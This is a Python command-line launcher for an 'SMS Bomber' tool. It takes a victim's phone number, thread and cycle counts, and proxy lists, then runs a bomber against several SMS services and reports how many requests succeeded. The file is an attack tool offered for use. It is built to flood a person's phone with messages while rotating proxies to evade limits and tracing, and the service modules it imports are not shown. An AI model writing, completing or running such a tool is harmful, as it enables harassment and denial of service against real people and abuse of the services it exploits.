import asyncio
import argparse
import sys
from core import Bomber, ProxyManager
from services import Service1, Service2, Service3


def parse_args():
    parser = argparse.ArgumentParser(description='SMS Bomber')
    parser.add_argument('phone', help='Phone number')
    parser.add_argument('-c', '--cycles', type=int, default=1, help='Number of cycles')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-p', '--proxy', help='Proxy file path')
    parser.add_argument('--proxy-list', nargs='+', help='List of proxies')
    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy usage')
    return parser.parse_args()


async def main():
    args = parse_args()
    
    services = [Service1, Service2, Service3]
    
    proxy_manager = None
    if not args.no_proxy:
        proxy_manager = ProxyManager()
        
        if args.proxy:
            proxy_manager.load_from_file(args.proxy)
        
        if args.proxy_list:
            for proxy in args.proxy_list:
                proxy_manager.add_proxy(proxy)
    
    bomber = Bomber(
        phone=args.phone,
        services=services,
        proxy_manager=proxy_manager,
        threads=args.threads
    )
    
    print(f"Starting SMS bomber for {args.phone}")
    print(f"Services: {len(services)}")
    print(f"Cycles: {args.cycles}")
    print(f"Threads: {args.threads}")
    if proxy_manager and proxy_manager.has_proxies():
        print(f"Proxies: {len(proxy_manager.get_all())}")
    else:
        print("Proxies: None")
    print("-" * 50)
    
    await bomber.start(cycles=args.cycles)
    
    stats = bomber.get_stats()
    print("\n" + "=" * 50)
    print("RESULTS:")
    print("=" * 50)
    print(f"Total requests: {stats['total']}")
    print(f"Successful: {stats['successful']}")
    print(f"Failed: {stats['failed']}")
    print("\nBy service:")
    for service, service_stats in stats['services'].items():
        print(f"  {service}: {service_stats['success']} success, {service_stats['failed']} failed")


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        sys.exit(0)

